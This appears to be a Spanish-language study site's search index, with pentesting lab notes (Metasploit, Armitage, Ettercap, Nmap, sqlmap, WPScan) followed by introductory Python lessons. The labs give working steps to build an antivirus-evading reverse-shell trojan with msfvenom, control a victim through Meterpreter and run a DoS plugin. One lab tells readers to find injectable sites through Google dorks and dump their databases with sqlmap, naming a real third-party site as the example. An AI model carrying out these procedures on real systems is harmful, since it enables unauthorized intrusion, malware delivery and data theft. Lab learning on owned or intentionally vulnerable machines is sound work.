dominio a una direcci\u00f3n IP especifica que fue la que hicimos de www.google.com A 192.168.0.247(IP Local). DNS EXACTA</li> <li>El asterisco (*) inicial se utiliza como comod\u00edn para representar cualquier nombre de dominio. Cuando se coloca al principio de una l\u00ednea seguido de un espacio, indica que esta configuraci\u00f3n se aplicara a todos los nombres de dominio que no coincidan con otras entradas en el archivo. MULTIPLES DNS RELEVANTES</li> <li>El PTR se utiliza para mapear direcciones IP a nombres de dominio en lugar de mapear nombres de dominio a direcciones IP como lo hacen la mayor\u00eda de las consultas DNS. CONSULTA INVERTIDA</li> <li>HAY QUE RECORDAR que este tipo de ataque puede ser mitigado en la capa de transporte o aplicaci\u00f3n al realizar una validaci\u00f3n de extremo a extremo como TLS y Firmas Digitales por lo que el navegador verifica si el certificado digital del servidor es v\u00e1lido antes de establecer una conexi\u00f3n por lo que esto solo funcionara en sitios web que no utilizan encriptaci\u00f3n.</li> </ul>"},{"location":"laboratorio/ettercap-lab/#laboratorio-3-ataques-dos-y-ddos","title":"LABORATORIO 3 (ATAQUES DOS y DDOS)","text":"<ol> <li>Abrimos la aplicaci\u00f3n ETTERCAP e Iniciamos</li> <li>Vamos al men\u00fa de Plugins y seleccionamos DOS_ATTACK</li> <li>Ingresamos a IP Objetivo y volvemos a ingresar la misma IP Objetivo</li> <li>Se comenzar\u00e1 a atacar a la maquina objetivo</li> </ol>"},{"location":"laboratorio/metasploit-lab/","title":"Metasploit","text":""},{"location":"laboratorio/metasploit-lab/#laboratorio-1-interaccion-basica","title":"LABORATORIO 1 (INTERACCION BASICA)","text":"<ol> <li> <p>Podemos ver la carpeta con los archivos de Metasploit Framework cd /usr/share/metasploit-framework/</p> </li> <li> <p>Ahora ejecutamos la consola de Metasploit: msfconsole</p> </li> <li>Ahora podemos buscar de la siguiente forma: search Type: exploit</li> <li>Podemos aplicar filtros ejemplo: search Type: exploit platform:windows</li> <li>Buscar vulnerabilidades comunes: search cve:2017</li> <li>Quiero atacar un sistema especifico: search name:wordpress</li> <li>Si queremos usarlo: use &lt;ruta/nombre&gt; (use exploit/unix/webapp/wp_total_cache_exec)</li> <li>Dentro podemos ver los objetivos: show targets</li> <li>Podemos ver m\u00e1s informaci\u00f3n: show info</li> <li>Podemos ver las opciones: show Options</li> <li>Modificar su opci\u00f3n de IP REMOTE HOST: set RHOST &lt;IP OBJETIVO&gt;</li> <li>Volvemos a ver las opciones con show Options y veremos la IP configurada</li> <li>Ahora veremos los Payloads \u00fatiles relacionados a este exploit: show payloads</li> <li>Y podemos usar el payload de igual forma que antes con use &lt;name/ruta&gt;</li> <li>Dentro podemos ver las opciones del Payload con show options</li> <li>Y podemos establecer nuestra configuraci\u00f3n del LOCAL HOST: set LHOST &lt;IP MAQUINA ATACANTE&gt;</li> <li>Y despu\u00e9s de realizar todas las configuraciones de las opciones simplemente ejecutamos: exploit</li> </ol> <p>Esto no har\u00e1 nada en espec\u00edfico ya que faltar\u00edan m\u00e1s opciones para poder ver un resultado ya que esto solo es una explicaci\u00f3n de c\u00f3mo utilizar Metasploit framework en una prueba de ejemplo.</p>"},{"location":"laboratorio/metasploit-lab/#laboratorio-2-creacion-de-troyano-e-infiltracion-a-objetivo","title":"LABORATORIO 2 (CREACION DE TROYANO E INFILTRACION A OBJETIVO)","text":"<ol> <li>En la terminal de Kali levantaremos el servicio PostgreSQL: service postgresql start</li> <li>Y abrimos la consola Metasploit: msfconsole</li> <li>Ejecutamos: msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;IP KALI&gt; LPORT=&lt;5555&gt; -f exe -e x86/shikata_ga_nai -i 10 &gt; trojan.exe (Mas adelante explicare cada configuraci\u00f3n)</li> <li>Creado el archivo deber\u00edamos tenerlo en /Home por lo que copiaremos y meteremos a la carpeta creada (winmount) en la pr\u00e1ctica pasada conectada a la maquina windows para enviar el troyano a la maquina v\u00edctima.</li> <li>Ahora en la consola de Metasploit ejecutar: use multi/handler</li> <li>Luego set payload windows/meterpreter/reverse_tcp</li> <li>Establecemos el host local: set LHOST &lt;IP MAQUINA KALI&gt;</li> <li>Y el Puerto: set LPORT 5555</li> <li>Y ejecutamos: exploit</li> <li>Regresamos a la maquina windows y volvemos a ejecutar el troyano</li> <li>Abierto el nuevo men\u00fa de meterpreter al establecer conexi\u00f3n con la maquina victima vemos la ayuda con el comando help</li> <li>Si queremos ver informaci\u00f3n del equipo ejecutamos: sysinfo</li> <li>Si queremos ver el directorio en el que estamos en la maquina windows a trav\u00e9s de Kali: ls</li> <li>Para ver configuraciones de red: ipconfig</li> <li>Queremos buscar los archivos (.doc) en la maquina: search -f *.doc</li> <li>Igual se puede con cualquier otro archivo, como ejemplo (.txt)</li> <li>Y si queremos descargarlo: download &lt;direcci\u00f3n del documento&gt; (Recuerda cambiar las barras a (/))</li> <li>Y de igual forma podemos subir un archivo: upload &lt;direcci\u00f3n origen kali&gt; &lt;direcci\u00f3n destino windows&gt; (Utilizando (\\) en esta \u00faltima)</li> <li>Usar la consola de windows: Shell</li> </ol> <p>EXTRA</p> <ul> <li>El comando msfvenom es el comando principal de Metasploit Framework que se utiliza para generar payloads personalizados.</li> <li>(-p windows/meterpreter/reverse_tcp) Especifica el payload que se utilizara, en este caso es un payload para windows que establece una conexi\u00f3n de Shell inversa usando el m\u00f3dulo Meterpreter de Metasploit Framework.</li> <li>LHOST=&lt;IP KALI&gt; Especifica la direcci\u00f3n IP del host atacante, es decir, la direcci\u00f3n IP de Kali Linux, donde se enviar\u00e1n las conexiones de retorno del sistema objetivo.</li> <li>LPORT=&lt;5555&gt; Esta opci\u00f3n especifica el puerto en el que escuchar\u00e1 el sistema Kali Linux para las conexiones de retorno del sistema objetivo. Aqu\u00ed, estamos utilizando el puerto 5555, pero puedes cambiarlo seg\u00fan tus necesidades.</li> <li>(-f exe) Esta opci\u00f3n especifica el formato de salida del payload generado. En este caso, estamos generando un archivo ejecutable de Windows (.exe).</li> <li>(-e x86/shikata_ga_nai) Esta opci\u00f3n especifica el encoder que se utilizar\u00e1 para codificar el payload y evadir la detecci\u00f3n de antivirus. En este caso, estamos utilizando el encoder x86/shikata_ga_nai, que es un encoder polim\u00f3rfico disponible en Metasploit Framework.</li> <li>(-i 10) Esta opci\u00f3n especifica el n\u00famero de iteraciones que se utilizar\u00e1n para codificar el payload. Cuantas m\u00e1s iteraciones, m\u00e1s dif\u00edcil ser\u00e1 para los antivirus detectar el payload. Aqu\u00ed, estamos utilizando 10 iteraciones.</li> <li>(&gt; trojan.exe) Esta parte del comando redirige la salida del payload generado al archivo trojan.exe, que es el nombre del archivo que se generar\u00e1 y que contendr\u00e1 el payload.</li> <li>use multi/handler: Este comando indica a Metasploit que se utilizar\u00e1 el m\u00f3dulo multi/handler, el cual es responsable de escuchar las conexiones entrantes de varios tipos de payloads. Seleccionar este m\u00f3dulo prepara Metasploit para recibir la conexi\u00f3n que ser\u00e1 establecida por el payload que generamos previamente con msfvenom.</li> <li>set payload windows/meterpreter/reverse_tcp: Este comando configura el tipo de payload que se espera recibir en el handler. En este caso, estamos configurando el payload para Windows que establece una conexi\u00f3n de Shell inversa usando el m\u00f3dulo Meterpreter de Metasploit Framework y el m\u00e9todo reverse_tcp.</li> </ul>"},{"location":"laboratorio/metasploit-lab/#laboratorio-3-interaccion-con-la-herramienta-armitage","title":"LABORATORIO 3 (INTERACCION CON LA HERRAMIENTA ARMITAGE)","text":"<ol> <li>Levantar el servicio postgresql en la terminal</li> <li>Ejecutamos Armitage: armitage</li> <li>Damos clic en Connect y Yes</li> <li>Se mostrar\u00e1 la interfaz GUI con 3 Paneles</li> <li>Nos vamos a la opci\u00f3n Armitage&gt;Preferences</li> <li>Buscamos la opci\u00f3n con nombre require_exploit_rank y el valor lo cambiamos a poor</li> <li>Ahora comenzaremos escaneando los hosts en Hosts&gt;Nmap Scan&gt;Quick Scan (OS detect)</li> <li>Ingresamos el rango de la LAN en mi caso es (192.168.0.0/24) y se nos mostraran las maquinas en la red</li> <li>Podemos seleccionar la maquina objetivo y con clic derecho ver los servicios</li> <li>Tambi\u00e9n seleccion\u00e1ndola y en las opciones superiores Attacks&gt;Find Attacks</li> <li>Ahora con clic derecho a la maquina objetivo tendremos la opci\u00f3n Attack con una variedad de ataques para la m\u00e1quina.</li> <li>Ahora crearemos un payload en el panel izquierdo payload&gt;windows&gt;meterpreter&gt;reverse_tcp</li> <li>Abierto el men\u00fa yo elegir\u00e9 el LPORT 9090</li> <li>En Output elegiremos exe y finalmente Launch</li> <li>Y guardaremos el documento en el escritorio con el nombre Virus101.exe</li> <li>En nuestro caso lo volvemos a mandar por la carpeta compartida entre las 2 m\u00e1quinas de la practica 5.8</li> <li>De nuevo en Armitage abrimos el documento de antes (reverse_tcp), elegimos el puerto 9090, Output multi/handler y Launch</li> <li>Ahora ejecutamos el virus en la maquina windows</li> <li>Y ahora el Logo de la maquina windows habr\u00e1 cambiado al igual de la nueva consola </li> <li>Y tendremos una nueva opci\u00f3n llamada Meterpreter 1 al dar clic derecho en la maquina</li> <li>De los cuales podremos usar para Explorar Archivos en la m\u00e1quina, abrir su Shell de comandos, tomar capturas de pantalla, abrir su webcam, o podemos observar las pulsaciones de tecla(Esta \u00faltima va a tardar un poco en iniciar)</li> </ol>"},{"location":"laboratorio/metasploitableVM/","title":"Metasploitable VM","text":""},{"location":"laboratorio/metasploitableVM/#laboratorio-1-instalacion-de-metasploitable-vm","title":"LABORATORIO 1 (INSTALACION DE METASPLOITABLE VM)","text":"<ul> <li>Necesitaremos instalar VirtualBox siguiendo las instrucciones</li> <li>Si te da error de kernel haz el siguiente paso, sino om\u00edtelo:</li> <li> <p>Instalamos los Header Kernels en este caso la versi\u00f3n 6.6.15 (Mi Mas Actual) sudo apt-get install linux-headers-6.6.15-amd64</p> </li> <li> <p>Y METASPLOITABLE VM que es un ZIP</p> </li> <li>Extraemos el ZIP y reiniciamos la maquina</li> <li>Abrimos VirtualBox</li> <li>Creamos una Nueva M\u00e1quina Virtual llamada Metasploitable, Type Linux, Versi\u00f3n Ubuntu 64Bit y en Virtual Hard Disk File&gt;Add seleccionamos \u00e9l .vmdk de nuestros archivos reci\u00e9n extra\u00eddos de Metasploitable2</li> <li>Abrimos File&gt;Tools&gt;Network Manager&gt;Host-only Networks&gt;Create</li> <li>En los ajustes de la VM acabada de crear, en Network seleccionamos Host-only Adapter y ejecutamos la maquina</li> <li>El usuario y contrase\u00f1a es msfadmin</li> <li>Ejecutamos ifconfig y pegamos la IP de la maquina en nuestro navegador</li> </ul>"},{"location":"laboratorio/metasploitableVM/#laboratorio-2-nikto-metasploitablevm","title":"LABORATORIO 2 (NIKTO-MetasploitableVM)","text":"<ul> <li>Ejecutada nuestra VM Metasploitable en KALI y loggeado obtenemos su ip con ifconfig y la ingresamos en el navegador deber\u00edamos ver su \u00edndex metasploitable2</li> <li>Minimizamos la VM y abrimos una terminal en Kali y escaneamos la ip con nikto: nikto -h &lt;IP_de_la_VM&gt;</li> <li>Si lo queremos exportar: nikto -h &lt;IP_de_la_VM&gt; -output &lt;ubicaci\u00f3n guardada&gt; -Format html</li> <li>Lo buscamos en la ubicaci\u00f3n asignada y abrimos con el navegador</li> <li>Y podremos ver el informe en un formato HTML</li> <li>Si queremos escanear vulnerabilidades exclusivamente para SQL Injection la opci\u00f3n 9 de Tuning nos ayudara (para ver opciones ejecutar nikto): nikto -h &lt;IP_de_la_VM&gt; -Tuning 9</li> </ul> <p>Tambi\u00e9n podemos escanear una de las aplicaciones web de Metasploitable que es DVWA: nikto -h http://&lt;IP_de_la_VM&gt;/dvwa/ -Tuning 9</p>"},{"location":"laboratorio/metasploitableVM/#laboratorio-3-owasp-zap-metasploitablevm","title":"LABORATORIO 3 (OWASP ZAP-MetasploitableVM)","text":"<ul> <li>Si no lo tienes debes descargarlo e instalarlo</li> <li>Lo abrimos desde las aplicaciones instaladas</li> <li>Elegimos Automated Scan, ponemos la URL y Attack</li> <li>Comenzar\u00e1 a escanear y en Alerts podremos ver la lista de las vulnerabilidades que se van encontrando</li> <li>Visto esto detenemos el escaneo para evitar el tr\u00e1fico de datos</li> </ul>"},{"location":"laboratorio/nmap-lab/","title":"NMAP","text":""},{"location":"laboratorio/nmap-lab/#laboratorio-1-escaneo-local-de-puertos","title":"LABORATORIO 1 (ESCANEO LOCAL DE PUERTOS)","text":"<ol> <li> <p>En la terminal de Kali ejecutamos (nmap &lt;ip objetivo&gt;) en mi caso ser\u00eda nmap 192.168.0.90</p> </li> <li> <p>Obtendremos resultado del escaneo de la ip objetivo</p> </li> <li>Para escaneo de ip en un rango ejecutaremos nmap 192.168.0.1-254 (Toma en cuenta que escanearas todas las ip dentro del rango por lo que tardara un poco m\u00e1s)</li> <li>El ejemplo para escanear una red seria nmap 192.168.0.0/24</li> <li>Para escanear un puerto: nmap -p &lt;puerto&gt; &lt;ip objetivo&gt;</li> <li> <p>Para escanear un rango de puertos: nmap -p &lt;rango&gt; &lt;ip objetivo&gt;   (nmap -p 1-100 192.168.0.90)</p> </li> <li> <p>Escaneo r\u00e1pido: nmap -F &lt;ip objetivo&gt;</p> </li> <li> <p>Para hacer un escaneo de todos los puertos: nmap -p- &lt;ip objetivo&gt; (Esto escaneara todos los puertos del objetivo por lo que tardara demasiado en terminar ya que son un total de 65535 puertos)</p> </li> <li> <p>Ver los scripts de nmap a poder ejecutar: cd /usr/share/nmap/scripts/</p> </li> </ol>"},{"location":"laboratorio/nmap-lab/#laboratorio-2-escaneo-local-de-puertos-con-filtros","title":"LABORATORIO 2 (ESCANEO LOCAL DE PUERTOS CON FILTROS)","text":"<ol> <li> <p>Hay que recordar que podemos ver el manual con: nmap --help</p> </li> <li> <p>Si quiero saber que hosts est\u00e1n en mi red sin comenzar un escaneo usamos (-sn solo es \u00fatil para dispositivos que tienen activado el ping): nmap -sn 192.168.0.0/24</p> </li> <li> <p>Con (ip a) veremos de forma resumida la ip de nuestra maquina</p> </li> <li> <p>Ya conociendo la ip de nuestra maquina podemos excluirla con el comando (\u2013exclude) para que no aparezca en el escaneo: nmap 192.168.0.0/24 --exclude 192.168.0.135 (ip de mi maquina)</p> </li> <li> <p>Al hacer un escaneo con nmap si no especificamos los puertos a escanear con el comando (-p) haremos solo un escaneo de los 1000 puertos m\u00e1s comunes, pero en este caso lo usaremos para agilizar el proceso con unos pocos puertos comunes de ejemplo (21,22,80,443,445,8080) y al final agregaremos el comando (-Pn) para especificar que haga el escaneo de puertos a pesar de que el host no responda al ping inicial. nmap -p 21,22,80,443,445,8080 192.168.0.0/24 --exclude 192.168.0.135 -Pn --open (Para mostrar solo los puertos abiertos)</p> </li> </ol>"},{"location":"laboratorio/transferencia-archivos/","title":"Transferencia de Archivos","text":""},{"location":"laboratorio/transferencia-archivos/#laboratorio-1-transferencia-de-archivos","title":"LABORATORIO 1 (TRANSFERENCIA DE ARCHIVOS)","text":"<ol> <li>En nuestra maquina Windows crearemos una carpeta en el escritorio en mi caso llamada tomount</li> <li>Le damos clic derecho, propiedades, compartiendo y en compartir</li> <li>Agregaremos una nueva entrada/usuario ah\u00ed mismo y seleccionaremos la opci\u00f3n Everyone (Cualquiera) y le damos permisos de Leer/Escribir</li> <li> <p>Guardamos los cambios en Share y veremos que nos da una direcci\u00f3n o ruta de la carpeta compartida. Direcci\u00f3n carpeta Windows: </p> </li> <li> <p>Ahora nos iremos a la maquina Kali y abrimos la terminal para instalar los servicios b\u00e1sicos de internet: apt-get install cifs-utils</p> </li> <li>Ahora crearemos otra carpeta llamada winmount en nuestro escritorio en Kali</li> <li>En la terminal antes abierta ejecutamos: mount.cifs //&lt;IP MAQUINA WINDOWS&gt;/&lt;Pegaremos la ruta desde la parte Users&gt; &lt;Ruta de la carpeta en Kali&gt; -o user=&lt;usuario Windows&gt;,uid=&lt;usuario kali&gt;(Este \u00faltimo para poder tener acceso a modificar la carpeta)</li> <li> <p>En mi caso quedar\u00eda de la siguiente forma: mount.cifs //192.168.0.90/Users/SrRusian/Desktop/tomount /home/rusian/Desktop/winmount -o user=SrRusian,uid=rusian (En vez de escribir la direcci\u00f3n de la carpeta en Kali la podemos arrastrar directamente a la terminal y se agregara la direcci\u00f3n sola)</p> </li> <li> <p>Nos pedir\u00e1 la contrase\u00f1a de la maquina Windows y la vamos a ingresar</p> </li> <li>Hecho esto podemos usar la carpeta para agregar documentos y se compartir\u00e1n entre las 2 m\u00e1quinas, puedes probar creando un archivo de texto desde kali y lo debemos ver en la carpeta de Windows y viceversa. (Es necesario volver a ejecutar el comando anterior cada vez que nuestra maquina Kali se apague/suspenda)</li> </ol>"},{"location":"laboratorio/vulnerar-sitioweb/","title":"Como Vulnerar un Sitio Web","text":""},{"location":"laboratorio/vulnerar-sitioweb/#laboratorio-1-inyeccion-via-sqlmap-con-metodo-get","title":"LABORATORIO 1 (INYECCION VIA SQLMAP CON METODO GET)","text":"<ul> <li>Abrimos el navegador y vamos a Google.com</li> <li>Buscamos php?id=1 y elegimos alguno de los resultados</li> </ul> <p>EJEMPLO: https://www.burobd.org/network-and-linkages.php?id=8</p> <ul> <li>Y para saber si el sitio es vulnerable al final de la URL agregamos \u2018</li> <li>Si es vulnerable nos debe mandar un error relacionado a \u201cError SQL Syntax\u201d </li> <li>Si es as\u00ed copiamos el enlace original de la p\u00e1gina y en la terminal ejecutamos: sqlmap -u &lt;URL&gt; --dbs</li> <li>Al final del an\u00e1lisis se nos mostraran las BD disponibles, en nuestro ejemplo nos interesa burobd_bd_2025 por lo que ejecutamos: sqlmap -u &lt;URL&gt; -D &lt;BDName&gt; --tables</li> <li>Obtenidas las tablas ahora queremos mostrar el contenido de una de ellas: sqlmap -u &lt;URL&gt; -D &lt;BDName&gt; -T &lt;tableName&gt; --columns</li> <li>Y ahora volcaremos estas columnas que elegiremos a nuestra maquina sqlmap -u &lt;URL&gt; -D &lt;BDName&gt; -T &lt;tableName&gt; -C &lt;col1,col2,etc&gt; --dump</li> <li>Copiamos la direcci\u00f3n donde se nos guard\u00f3 el volcado y en otra terminal lo abrimos con leafpad leafpad &lt;UBICACION&gt;</li> <li>Veremos los datos obtenidos de la tabla en la base de datos</li> </ul>"},{"location":"laboratorio/vulnerar-sitioweb/#segundo-sitio-de-prueba","title":"SEGUNDO SITIO DE PRUEBA","text":"<ul> <li>Vamos a ir a un sitio web intencionalmente vulnerable testphp.vulnweb.com/index.php</li> <li>Navegamos un poco en la web y copiamos una de sus URL</li> <li>Y en la terminal podemos hacer lo mismo que en la PRACTICA 1</li> </ul>"},{"location":"laboratorio/vulnerar-sitioweb/#laboratorio-2-inyeccion-via-sqlmap-con-metodo-post","title":"LABORATORIO 2 (INYECCION VIA SQLMAP CON METODO POST)","text":"<ul> <li>Abrimos Burp Suite, seleccionamos un proyecto temporal, lo iniciamos y en Proxy&gt;Intercept&gt;Intercept On</li> <li>Y ahora redirigiremos el tr\u00e1fico configurando nuestro PROXY en el navegador&gt;Ajustes/Preferencias&gt;Proxy&gt;Settings&gt;Manual proxy<ul> <li>HTTP Proxy: 127.0.0.1</li> <li>Port: 8080</li> <li>HTTPS Proxy:127.0.0.1</li> <li>Port: 8080</li> </ul> </li> <li>Abrimos en Burp los Proxy Settings&gt;Export CA Certificate&gt;Certificate in DER format</li> <li>Guardamos el documento en el escritorio con la extensi\u00f3n .der</li> <li>Abrimos el navegador&gt;Ajustes&gt;Certificates&gt;View&gt;Authorities&gt;import</li> <li>Seleccionamos nuestro documento antes guardado y se habr\u00e1 importado el certificado</li> <li>Y ahora todo el tr\u00e1fico ira al servidor proxy antes que llegue a internet</li> <li>Nos vamos a una p\u00e1gina vulnerable o que use POST(Login)</li> <li>Tratamos de logearnos con datos aleatorios</li> <li>Abrimos Burp Suite y nos vamos a HTTP History</li> <li>Buscamos el host al que entramos antes con POST, seleccionamos y en la parte inferior tendremos m\u00e1s informaci\u00f3n que seleccionaremos completamente, clic derecho y Copy To File</li> <li>Guardaremos el texto como sqli.txt y abriremos la terminal</li> <li>Ejecutamos sqlmap -r &lt;ubicacionDeNuestroTxt&gt;</li> <li>Comenzaremos a buscar vulnerabilidades como en la PRACTICA 1 y 2 para tratar de obtener la BD</li> </ul> <p>EXTRAS (Pruebas a otras Paginas) </p> <p></p>"},{"location":"laboratorio/wireshark-lab/","title":"WireShark","text":""},{"location":"laboratorio/wireshark-lab/#laboratorio-1-interaccion-basica","title":"LABORATORIO 1 (INTERACCION BASICA)","text":"<ol> <li>Abrimos Wireshark</li> <li>Filtramos las interfaces (Usaremos solo Wireless esta vez)</li> <li>Iniciamos la captura de paquetes en la red </li> <li>En la pantalla superior se observa el tr\u00e1fico de datos en la red basado en el filtro que antes aplicamos.</li> <li>En otra maquina con WINDOWS debemos instalar netcat, para eso instalaremos Nmap y lo instalaremos en la m\u00e1quina.</li> <li>Abrimos su CMD y ejecutamos ncat -nlvp 2222 (2222 es el puerto que usaremos)</li> <li>En Kali abriremos la terminal y ejecutaremos nc -nv (la ip de la maquina objetivo) (su puerto) en este ejemplo el mio es (nc -nv 192.168.0.90 2222)</li> <li>Escribimos un mensaje y damos enter</li> <li>El mensaje lo debemos recibir en la CMD de nuestra maquina WINDOWS </li> <li>Regresamos a Wireshark y lo detenemos </li> <li>En la barra inferior del bot\u00f3n de detener que dice Apply a display filter\u2026 aplicamos el filtro tcp)</li> <li>Tendremos varios resultados de los cuales el primero es el HANDSHAKE o inicio de la conexi\u00f3n de la maquina Kali con la Windows.</li> </ol> <p>El siguiente es un mensaje de que la conexi\u00f3n se ha hecho el cual va desde la maquina Windows hacia Kali.</p> <p>Posteriormente el tercer paquete deber\u00eda ser el primer mensaje el cual enviamos desde kali.</p> <ol> <li>Seleccionaremos el paquete que creemos es que se mand\u00f3 el texto plano y con clic derecho nos vamos a Follow&gt;TCP Stream</li> <li>Podremos ver el resultado final que sucedi\u00f3 en esta conexi\u00f3n el cual ser\u00e1 el mensaje o mensajes enviados de una a otra m\u00e1quina.</li> </ol>"},{"location":"laboratorio/wpscan-lab/","title":"WPScan","text":""},{"location":"laboratorio/wpscan-lab/#laboratorio-1-instalacion-de-wordpress-vm","title":"LABORATORIO 1 (INSTALACION DE WORDPRESS VM)","text":"<p>Para esta prueba usaremos un entorno seguro, descargaremos la VM WordPress ISO.</p> <ul> <li>Abrimos VirtualBox y Agregamos una nueva m\u00e1quina llamada WordPress, elegimos la ISO descargada, el almacenamiento de 8gb(opcional), la creamos e iniciamos.</li> <li>Elegimos instalar en el disco y dejamos todas las opciones por defecto, aceptamos y reiniciamos la VM.</li> <li>Al reiniciar elegiremos las contrase\u00f1as de acceso a decisi\u00f3n propia, recomiendo usar las mismas en todas para las pruebas posteriores</li> <li>Podemos hacer el paso de agregar la API Key, en mi caso lo hare de una vez pero es opcional</li> <li>Finalmente configurada la VM se nos mostrara las direcciones ip para poder acceder a ellas desde nuestro navegador, as\u00ed tendr\u00edamos la instalaci\u00f3n correctamente hecha.(En ajustes de la VM debemos tener la configuraci\u00f3n de network adapter como bridge o puente e iniciarla de esa forma para poder acceder a las ip) </li> </ul>"},{"location":"laboratorio/wpscan-lab/#laboratorio-2-obtencion-de-claves-con-fuerza-bruta","title":"LABORATORIO 2 (OBTENCION DE CLAVES CON FUERZA BRUTA)","text":"<ul> <li>Actualizar wpscan (wpscan --update)</li> <li>Escaneamos la ip de WordPress de la VM (wpscan --url 192.168.1.47)</li> <li>Podemos agregar el (-e u) para enumerar a los usuarios (wpscan --url 192.168.1.47 -e u) </li> <li>Obtenemos que hay un usuario administrador</li> <li>Con el comando (--help) podemos ver sus opciones a detalle</li> <li>Con el nombre de usuario obtenido podemos ejecutar un ataque de fuerza bruta con un diccionario de palabras que tengamos, ocuparemos especificar la ruta del diccionario y el usuario a atacar</li> <li>(wpscan --url 192.168.1.47 -P /Desktop/wordlist.txt -U admin)</li> <li>Si nuestro diccionario es fuerte y tiene muchas contrase\u00f1as y una logra coincidir podremos obtener la contrase\u00f1a de administrador del sitio de WordPress </li> <li>Esta misma prueba y muchas m\u00e1s opciones de WPScan pueden ser aplicadas en sitios web, sin embargo esto no es recomendable hacerlo aparte de ser ilegal</li> </ul>"},{"location":"lenguages/python/00_Introduccion/","title":"00 - Introducci\u00f3n a Python \ud83d\udc0d","text":""},{"location":"lenguages/python/00_Introduccion/#1-que-es-python","title":"1. \u00bfQu\u00e9 es Python?","text":"<p>Python fue creado por Guido van Rossum, un programador holand\u00e9s, a finales de los a\u00f1os 80 y lanzado oficialmente en 1991. El nombre del lenguaje proviene del grupo de comedia Monty Python.</p> <p>Se dise\u00f1\u00f3 para ser: - F\u00e1cil de leer y escribir - Con sintaxis clara y concisa - Altamente vers\u00e1til</p> <p>Actualmente es uno de los lenguajes m\u00e1s utilizados en el mundo.</p>"},{"location":"lenguages/python/00_Introduccion/#2-caracteristicas-de-python","title":"2. Caracter\u00edsticas de Python","text":"<ul> <li>\u2714 Legibilidad: Sintaxis clara y estructurada mediante indentaci\u00f3n.</li> <li>\u2714 Tipado din\u00e1mico: No necesitas declarar tipos expl\u00edcitamente.</li> <li>\u2714 Interpretado: El c\u00f3digo se ejecuta l\u00ednea por l\u00ednea.</li> <li>\u2714 Multiplataforma: Funciona en Windows, macOS y Linux sin cambios.</li> <li>\u2714 Amplia biblioteca est\u00e1ndar: M\u00f3dulos para archivos, bases de datos, web, etc.</li> <li>\u2714 Comunidad activa: Gran ecosistema de soporte, frameworks y herramientas.</li> </ul>"},{"location":"lenguages/python/00_Introduccion/#3-aplicaciones-comunes","title":"3. Aplicaciones comunes","text":"Categor\u00eda Descripci\u00f3n Ciencia de datos Uso de NumPy, Pandas y Matplotlib para an\u00e1lisis. Desarrollo web Frameworks como Django y Flask para el backend. IA y Machine Learning TensorFlow, Scikit-learn, PyTorch. Automatizaci\u00f3n de tareas Scripts para scraping, archivos, pruebas. Desarrollo de juegos Bibliotecas como Pygame para juegos simples."},{"location":"lenguages/python/00_Introduccion/#4-instalacion-de-python","title":"4. Instalaci\u00f3n de Python","text":"<ol> <li>Ve a python.org/downloads</li> <li>Descarga la versi\u00f3n para tu sistema operativo.</li> <li>En Windows, activa \"Add Python to PATH\".</li> <li>Sigue el instalador hasta finalizar.</li> </ol>"},{"location":"lenguages/python/00_Introduccion/#5-entorno-de-desarrollo","title":"5. Entorno de Desarrollo","text":"<p>IDE recomendados: - Visual Studio Code (ligero y personalizable) - PyCharm (completo y profesional) - Sublime Text (r\u00e1pido y extensible)</p> <p>Alternativa interactiva: - Jupyter Notebooks, ideal para ciencia de datos y prototipos.</p>"},{"location":"lenguages/python/00_Introduccion/#como-instalar-jupyter","title":"C\u00f3mo instalar Jupyter","text":"<pre><code>pip install notebook\njupyter notebook\n</code></pre>"},{"location":"lenguages/python/00_Introduccion/#6-tu-primer-programa","title":"6. Tu primer programa","text":"<pre><code>print(\"\u00a1Hola, Mundo!\")\n</code></pre> <p>Guarda como <code>hola_mundo.py</code> y ejec\u00fatalo en tu editor o terminal.</p>"},{"location":"lenguages/python/00_Introduccion/#7-sintaxis-basica","title":"7. Sintaxis b\u00e1sica","text":""},{"location":"lenguages/python/00_Introduccion/#indentacion","title":"Indentaci\u00f3n","text":"<pre><code>if x &gt; 0:\n    print(\"Positivo\")\nelse:\n    print(\"No positivo\")\n</code></pre>"},{"location":"lenguages/python/00_Introduccion/#comentarios","title":"Comentarios","text":"<pre><code># Esto es un comentario de una l\u00ednea\n\n\"\"\"\nEsto es un comentario\nde varias l\u00edneas\n\"\"\"\n</code></pre>"},{"location":"lenguages/python/00_Introduccion/#mayusculas-importan","title":"May\u00fasculas importan","text":"<pre><code>variable != Variable != VARIABLE\n</code></pre>"},{"location":"lenguages/python/00_Introduccion/#punto-y-coma","title":"Punto y coma","text":"<pre><code>x = 1; y = 2; print(x + y)\n</code></pre>"},{"location":"lenguages/python/00_Introduccion/#parentesis","title":"Par\u00e9ntesis","text":"<pre><code>resultado = (a + b) * c\n</code></pre> <p>\u2705 \u00a1Con esto tienes una base s\u00f3lida para comenzar a programar en Python!</p>"},{"location":"lenguages/python/01_Fundamentos/","title":"01 - Fundamentos de Python \ud83d\udd27","text":""},{"location":"lenguages/python/01_Fundamentos/#2-tipos-de-datos-basicos","title":"2. Tipos de datos b\u00e1sicos","text":"<p>En Python, los tipos de datos b\u00e1sicos son esenciales para entender c\u00f3mo se manipulan los valores y variables. Estos incluyen:</p>"},{"location":"lenguages/python/01_Fundamentos/#enteros-int","title":"\ud83d\udd22 Enteros (<code>int</code>)","text":"<p>N\u00fameros sin parte decimal.</p> <pre><code>edad = 25\ncantidad = 100\n</code></pre>"},{"location":"lenguages/python/01_Fundamentos/#flotantes-float","title":"\ud83d\udd38 Flotantes (<code>float</code>)","text":"<p>N\u00fameros con parte decimal.</p> <pre><code>precio = 9.99\naltura = 1.75\n</code></pre>"},{"location":"lenguages/python/01_Fundamentos/#cadenas-de-texto-str","title":"\ud83d\udcdd Cadenas de texto (<code>str</code>)","text":"<p>Texto encerrado entre comillas simples o dobles.</p> <pre><code>nombre = \"Juan\"\nmensaje = '\u00a1Hola, mundo!'\n</code></pre> <p>Puedes usar <code>\\</code> para escapar comillas, o usar triples comillas para texto multil\u00ednea:</p> <pre><code>mensaje = \"\"\"Hola,\nesto es multilinea\"\"\"\n</code></pre>"},{"location":"lenguages/python/01_Fundamentos/#booleanos-bool","title":"\u2705 Booleanos (<code>bool</code>)","text":"<p>Valores de verdad: <code>True</code> o <code>False</code>.</p> <pre><code>es_mayor_de_edad = True\ntiene_descuento = False\n</code></pre> <p>Nota: True y False deben escribirse con may\u00fascula inicial.</p>"},{"location":"lenguages/python/01_Fundamentos/#21-variables","title":"2.1 Variables","text":"<p>Las variables almacenan y representan datos. Python asigna autom\u00e1ticamente el tipo seg\u00fan el valor.</p> 